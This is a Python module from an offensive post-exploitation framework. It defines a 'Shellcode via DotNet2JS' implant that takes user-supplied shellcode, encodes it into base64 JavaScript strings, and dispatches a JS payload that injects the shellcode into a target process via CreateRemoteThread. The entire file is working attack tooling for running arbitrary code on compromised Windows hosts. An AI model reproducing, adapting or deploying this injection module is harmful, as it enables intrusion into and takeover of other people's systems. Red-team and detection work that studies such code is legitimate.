import core.implant
import core.job

class SDotNet2JSJob(core.job.Job):
    def create(self):
        self.errstat = 0

    def report(self, handler, data, sanitize = False):
        data = data.decode('latin-1')

        if len(data) == 0:
            handler.reply(200)
            return

        if data == "Complete" and self.errstat != 1:
            super(SDotNet2JSJob, self).report(handler, data)

        #self.print_good(data)

        handler.reply(200)

    def done(self):
        self.results = "Complete"
        self.display()

    def display(self):
        try:
            self.print_good(self.data)
        except:
            pass
        #self.shell.print_plain(str(self.errno))

class SDotNet2JSImplant(core.implant.Implant):

    NAME = "Shellcode via DotNet2JS"
    DESCRIPTION = "Executes arbitrary shellcode using the DotNet2JS technique. Inject shellcode into a host process via createremotethread as a new thread."
    AUTHORS = ["entynetproject", "TheNaterz", "tiraniddo", "psmitty"]
    STATE = "implant/inject/shellcode_dotnet2js"

    def load(self):
        self.options.register("DLLCOMMANDS", "", "string to pass to dll if needed", required=False)
        self.options.register("SC_HEX", "", "relative path to shellcode/dll hex or paste hex string", required=True)
        self.options.register("SC_B64", "", "shellcode in base64", advanced=True)
        self.options.register("DLLOFFSET", "0", "Offset to the reflective loader", advanced=True)
        self.options.register("PID", "0", "process ID to inject into (0 = current process)", required=True)

    def job(self):
        return SDotNet2JSJob

    def scb64(self, path):
        import base64
        import os.path
        import binascii

        if os.path.isfile(path):
            with open(path, 'r') as fileobj:
                text = base64.b64encode(binascii.unhexlify(fileobj.read())).decode()
        else:
            text = base64.b64encode(binascii.unhexlify(path)).decode()

        index = 0
        ret = '"';
        for c in text:
            ret += str(c)
            index += 1
            if index % 100 == 0:
                ret += '"+\r\n"'

        ret += '"'
        return ret

    def run(self):

        self.options.set("SC_B64", self.scb64(self.options.get("SC_HEX")))
        #self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))

        workloads = {}
        workloads["js"] = self.loader.load_script("data/implant/inject/shellcode_dotnet2js.js", self.options)

        self.dispatch(workloads, self.job)
